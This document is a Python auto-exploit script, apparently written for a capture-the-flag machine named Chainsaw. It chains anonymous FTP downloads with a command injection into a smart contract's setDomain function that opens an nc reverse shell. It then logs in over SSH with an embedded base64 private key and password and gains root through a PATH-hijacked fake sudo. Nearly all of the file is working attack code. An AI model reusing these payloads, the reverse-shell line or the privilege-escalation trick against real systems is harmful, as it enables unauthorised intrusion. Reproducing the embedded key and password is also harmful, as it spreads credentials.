#!/usr/bin/python3

import json
import pexpect
import random
from web3 import Web3
from pwn import *
import subprocess
from time import sleep
import netifaces as ni
from ftplib import FTP
from base64 import b64decode

ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

def shell(user):
	if user == 'administrator':
		log.info('Downloading files from FTP server')
		ftp = FTP('10.10.10.142')
		ftp.login('anonymous','wow')
		files = ftp.nlst()
		for file in files:
			ftp.retrbinary("RETR " + file ,open(file, 'wb').write)
		p = subprocess.Popen(['which','jq'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		stdout,stderr = p.communicate()
		p = subprocess.Popen(['cat WeaponizedPing.json | jq .abi'],shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		stdout,stderr = p.communicate()
		log.info('Loading abi from WeaponizedPing.json')
		abi = json.loads(stdout)
		web3 = Web3(Web3.HTTPProvider('http://10.10.10.142:9810'))
		web3.eth.defaultAccount = web3.eth.accounts[0]
		address = open('address.txt','r').read().strip()
		contract = web3.eth.contract(address=address,abi=abi)
		log.info('Initiating the Transaction')
		port = random.randint(0,65535)
		l = listen(port)
		log.info('Triggering shell')
		contract.functions.setDomain('{};rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {}>/tmp/f'.format(ip,ip,port)).transact()
		c = l.wait_for_connection()
		c.sendline('''/usr/bin/python -c 'import pty;pty.spawn("/bin/bash")' ''')
		c.interactive()
	else:
		key='''LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNTNEODgxRjI5OUJBODUwMwoKU2VDTll3L0JzWFB5UXExSFJMRUVLaGlOSVZmdFphZ3pPY2M2NGZmMUlwSm85SWVHN1ovemordjFkQ0lkZWp1awo3a3RRRmN6VGx0dG5ySWo2bWRCYjZybk42Q3NQMHZiejlOelJCeWcxbzZjU0dkckwyRW1KTi9lU3hENEFXTGN6Cm4zMkZQWTBWamxJVnJoNHJqaFJlMndQTm9nQWNpQ0htWkdFQjB0Z3YyL2V5eEU2M1ZjUnpyeEpDWWwraHZTWjYKZnZzU1g4QTRRcjdyYmY5Zm56NFBJbUlndXJGM1ZoUW1kbEVtekRSVDRtL3BxZjNUbUdBazkrd3JpcW5rT0RGUQpJKzJJMWNQYjhKUmhMU3ozcHlCM1gvdUdPVG5ZcDRhRXErQVFaMnZFSnozRmZYOVNYOWs3ZGQ2S2FadFNBenFpCnc5ODFFUzg1RGs5TlVvOHVMeG5aQXczc0Y3UHo0RXVKMEhwbzFlWmdZdEt6dkRLcnJ3OHVvNFJDYWR4N0tIUlQKaW5LWGR1SHpuR0ExUVJPelpXN3hFM0hFTDN2eFI5Z01WOGdKUkhEWkRNSTl4bHc5OVFWd2N4UGNGYTMxQXpWMgp5cDNxN3lsOTU0U0NNT3RpNFJDM1o0eVVUakRrSGRIUW9FY0dpZUZPV1UraTFvaWo0Y3J4MUxiTzJMdDhuSEs2CkcxQ2NxN2lPb240UnNUUmxWcnY4bGlJR3J4bmhPWTI5NWU5ZHJsN0JYUHBKcmJ3c284eHhIbFQzMzMzWVU5ZGoKaFFMTnA1KzJINCtpNm1tVTN0Mm9nVG9QNHNrVmNvcURsQ0MrajZoRE9sNGJwRDl0NlRJSnVyV3htcEdnTnhlcwpxOE5zQWVudGJzRCt4bDRXNnE1bXVMSlFtai94UXJySGFjRVpER0k4a1d2WkUxaUZtVmtEL3hCUm53b0daNWh0CkR5aWxMUHBsOVIrRGg3YnkzbFBtOGtmOHRRbkhzcXBSSGNleUJGRnBucTBBVWRFS2ttMUxSTUxBUFlJTGJsS0cKandyQ3FSdkJLUk1JbDZ0SmlEODdOTTZKQm9ReWRPRWNwbis2RFUrMkFjdGVqYnVyMGFNNzRJeWVlbnJHS1NTWgpJWk1zZDJrVFNHVXh5OW8veFBLRGtVdy9TRlV5U21td2lxaUZMNlBhRGd4V1F3SHh0eHZtSE1oTDZjaXROZEl3ClRjT1RTSmN6bVIycEp4a29oTHJIN1lyUzJhbEtzTTBGcEZ3bWR6MS9YRFNGMkQ3aWJmL1cxbUF4TDVVbUVxTzAKaFVJdVcxZFJGd0hqTnZhb1NrK2ZyQXA2aWM2SVBZU21kbzhHWVl5OHBYdmNxd2ZScHhZbEFDWnU0RmlpNmhZaQo0V3BoVDNaRllEcnc3U3RnSzA0a2JEN1FrUGVOcTlFdjFJbjJuVmR6RkhQSWg2eitmbXBiZ2ZXZ2VsTEhjMmV0ClNKWTQrNUNFYmtBY1lFVW5QV1k5U1BPSjdxZVU3K2IvZXF6aEtia3BuYmxtaUsxZjNyZU9NMllVS3k4YWFsZWgKbkpZbWttcjN0M3FHUnpoQUVUY2tjOEhMRTExZEdFK2w0YmE2V0JOdTE1R29FV0Fzenp0TXVJVjFlbW50OTdvTQpJbW5mb250T1lkd0I2LzJvQ3V5SlRpZjhWdy9XdFdxWk5icGV5OTcwNGE5bWFwLytiRHFlUVE0MStCOEFDRGJLCldvdnNneVdpL1VwaU1UNm02clgrRlA1RDVFOHpyWXRubm1xSW83dnhIcXRCV1V4amFoQ2RuQnJrWUZ6bDZLV1IKZ0Z6eDNlVGF0bFpXeXI0a3N2Rm10b2JZa1pWQVFQQUJXeitnSHB1S2xycWhDOUFOenIvSm4rNVpmRzAybW9GLwplZEwxYnA5SFBSSTQ3RHl2THd6VDEvNUw5Wno2WSsxTXplbmRUaTNLcnpRL1ljZnI1WUFSdll5TUxiTGpNRXRQClV2SmlZNDB1Mm5tVmI2UXFwaXkyenIvYU1saHB1cFpQay94dDhvS2hLQytsOW1nT1RzQVhZakNiVG1MWHpWclgKMTVVMjEwQmR4RUZVRGNpeE5pd1Rwb0JTNk1meENPWndOLzFadjBtRThFQ0krNDRMY3FWdDN3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0='''
		subprocess.Popen(['echo -n {} | base64 -d > bobby.key'.format(key)],shell=True)
		subprocess.Popen(['chmod 400 bobby.key'],shell=True)
		p = pexpect.spawn("ssh -i bobby.key bobby@10.10.10.142")
		p.expect(':')
		p.sendline('jackychain')
		if user == 'bobby':
			p.interact()
		else:
			p.sendline(''' echo '#!/bin/sh'>sudo ''')
			p.sendline(''' echo '/bin/sh' >> sudo ''')
			p.sendline('chmod +x sudo')
			p.sendline('export PATH=.:$PATH')
			p.sendline('/home/bobby/projects/ChainsawClub/ChainsawClub')
			p.sendline(''' /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")' ''')
			p.interact()

if __name__=="__main__":
	print('''
      .-----.
     /::::::|^^^^^^^^^^^^^^^^^^^^^^^^^.
    |():::::| .  .  .  .  .  .  .  .  .}
     \::::::|                         .'
      '-----'^^^^^^^^^^^^^^^^^^^^^^^^^
						Let's Chop This Box Down..
									by MrR3boot''')
	print('1. administrator')
	print('2. bobby')
	print('3. root')
	input = input('> ').strip()
	if input == '1':
		shell('administrator')
	elif input == '2':
		shell('bobby')
	else:
		shell('root')
